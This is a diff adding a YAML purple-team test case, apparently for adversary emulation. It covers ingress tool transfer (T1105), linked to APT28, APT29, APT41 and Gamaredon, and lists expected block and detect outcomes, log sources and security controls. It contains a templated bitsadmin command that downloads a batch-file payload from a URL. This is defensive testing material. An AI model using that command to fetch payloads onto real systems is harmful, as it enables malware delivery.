@@ -1,0 +1,36 @@
+name: Download batch file using bitsadmin over HTTP
+description: Download a batch file payload from a public HTTP server using bitsadmin
+metadata:
+  isv: 1
+  tactic: TA0011
+  tid: T1105
+  x_vectr_id: bcbb7655-18b0-4385-bc05-b6af2e98e4b9
+  groups:
+  - APT28
+  - APT29
+  - APT41
+  - Gamaredon
+platforms:
+- windows
+guidance:
+- cmd> cmd /c bitsadmin /transfer bbbb {{ url }} {{ local_dest }}
+block:
+- Connections to known malicious domains/IPs are blocked
+- Signatues for known bad tools are blocked by network security controls such as an
+  ID/PS
+- Suspicious process execution/behavior blocked by endpoint security tool
+detect:
+- Connections to known malicious domains/IPs are detected
+- Signatues for known bad tools are detected by network security controls such as
+  an ID/PS
+- Suspicious process execution/behavior is detected by endpoint security tool or triggers
+  alert in SIEM based on telemetry
+logs:
+- web
+- process_create
+- edr:telemetry
+controls:
+- Firewall
+- ID/PS
+- Endpoint Protection
+- SIEM
